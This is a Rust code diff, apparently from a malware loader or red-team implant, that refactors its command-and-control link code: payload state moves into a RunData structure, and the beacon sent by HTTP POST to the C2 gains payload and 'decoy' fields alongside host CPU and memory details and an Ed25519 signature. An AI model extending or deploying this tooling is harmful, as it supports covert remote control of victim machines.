@@ -6,8 +6,9 @@ use crate::link_util::get_domain_name;
 use crate::link_util::process_name_and_parent;
 use crate::link_util::process_path;
 use crate::link_util::working_dir;
-use crate::payload::Payload;
+//use crate::payload::Payload;
 use crate::poollink::Advanced;
+use crate::rundata::RunData;
 use crate::utils::expand_arg;
 
 use anyhow::bail;
@@ -47,9 +48,10 @@ impl Link {
         advanced: &Advanced,
         link_nb: i32,
         session_id: &String,
-        running_thread: &Vec<Payload>,
+        //running_thread: &Vec<Payload>,
+        run_data: &RunData,
     ) -> Result<Config, anyhow::Error> {
-        let result = self.fetch_data_with_post(session_id, running_thread, config);
+        let result = self.fetch_data_with_post(session_id, run_data, config);
         let data: Vec<u8> = match result {
             Ok(data) => data,
             Err(error) => bail!(
@@ -147,7 +149,8 @@ pub trait LinkFetch {
     fn download_data_post(
         &self,
         session_id: &String,
-        running_thread: &Vec<Payload>,
+        //running_thread: &Vec<Payload>,
+        run_data: &RunData,
         config: &Config,
     ) -> Result<Vec<u8>, anyhow::Error>;
     fn get_target(&self) -> String;
@@ -184,11 +187,12 @@ pub trait LinkFetch {
     fn fetch_data_with_post(
         &self,
         session_id: &String,
-        running_thread: &Vec<Payload>,
+        //running_thread: &Vec<Payload>,
+        run_data: &RunData,
         config: &Config,
     ) -> Result<Vec<u8>, anyhow::Error> {
         self.sleep_and_jitt();
-        let data = self.download_data_post(session_id, running_thread, config)?;
+        let data = self.download_data_post(session_id, run_data, config)?;
         self.un_apply_all_dataoperations(data)
     }
 }
@@ -208,7 +212,8 @@ impl LinkFetch for Link {
     fn download_data_post(
         &self,
         session_id: &String,
-        running_thread: &Vec<Payload>,
+        //running_thread: &Vec<Payload>,
+        run_data: &RunData,
         config: &Config,
     ) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
@@ -216,7 +221,7 @@ impl LinkFetch for Link {
             Link::DNS(link) => link.download_data(config),
             Link::FILE(link) => link.download_data(config),
             Link::MEMORY(link) => link.download_data(config),
-            Link::HTTPPostC2(link) => link.download_data_post(session_id, running_thread, config),
+            Link::HTTPPostC2(link) => link.download_data_post(session_id, run_data, config),
         }
     }
 
@@ -268,7 +273,8 @@ impl LinkFetch for FileLink {
     fn download_data_post(
         &self,
         _session_id: &String,
-        _running_thread: &Vec<Payload>,
+        //running_thread: &Vec<Payload>,
+        _run_data: &RunData,
         _config: &Config,
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
@@ -357,7 +363,8 @@ impl LinkFetch for MemoryLink {
     fn download_data_post(
         &self,
         _session_id: &String,
-        _running_thread: &Vec<Payload>,
+        //running_thread: &Vec<Payload>,
+        _run_data: &RunData,
         _config: &Config,
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
@@ -384,7 +391,8 @@ impl LinkFetch for DNSLink {
     fn download_data_post(
         &self,
         _session_id: &String,
-        _running_thread: &Vec<Payload>,
+        //running_thread: &Vec<Payload>,
+        _run_data: &RunData,
         _config: &Config,
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
@@ -418,7 +426,8 @@ impl LinkFetch for HTTPLink {
     fn download_data_post(
         &self,
         _session_id: &String,
-        _running_thread: &Vec<Payload>,
+        //running_thread: &Vec<Payload>,
+        _run_data: &RunData,
         _config: &Config,
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
@@ -466,8 +475,14 @@ pub struct PostToC2 {
     pub nb_cpu: usize,
 
     pub data_operation: Vec<DataOperation>,
-    pub running_thread: Vec<String>,
-    pub peer_public_key_bytes: Vec<u8>,
+    //pub running_thread: Vec<String>,
+    pub running_thread_payload: Vec<String>,
+    pub runonce_payload: Vec<String>,
+    pub running_thread_decoy_update: Vec<String>,
+    pub runonce_decoy_update: Vec<String>,
+    pub running_thread_decoy_payload: Vec<String>,
+    pub runonce_decoy_payload: Vec<String>,
+    pub peer_public_key_bytes : Vec<u8>,
     pub sign_bytes: Vec<u8>,
 }
 
@@ -478,13 +493,19 @@ impl LinkFetch for HTTPPostC2Link {
     fn download_data_post(
         &self,
         session_id: &String,
-        running_thread: &Vec<Payload>,
+        //running_thread: &Vec<Payload>,
+        run_data: &RunData,
         config: &Config,
     ) -> Result<Vec<u8>, anyhow::Error> {
-        let mut running_thread_string = vec![];
-        for thread in running_thread {
-            running_thread_string.push(thread.string_payload_compact());
+
+
+        let mut running_thread_payload_string: Vec<String> = vec![];
+        for (_thread,payload_list) in &run_data.running_thread_payload {
+            running_thread_payload_string.push(payload_list.string_payload_compact());
         }
+
+
+
 
         let key_pair: signature::Ed25519KeyPair =
             match signature::Ed25519KeyPair::from_pkcs8(config.loader_keypair.as_ref()) {
@@ -516,7 +537,14 @@ impl LinkFetch for HTTPPostC2Link {
             used_memory: bytes_to_gigabytes_string(sys.used_memory()),
             nb_cpu: sys.cpus().len(),
             data_operation: self.dataoperation.clone(),
-            running_thread: running_thread_string.clone(),
+            running_thread_payload: running_thread_payload_string.clone(),
+            //TODO
+            runonce_payload: vec![],
+            running_thread_decoy_update: vec![],
+            runonce_decoy_update: vec![],
+            running_thread_decoy_payload: vec![],
+            runonce_decoy_payload: vec![],
+
             peer_public_key_bytes: peer_public_key_bytes.clone(),
             sign_bytes: vec![],
         };
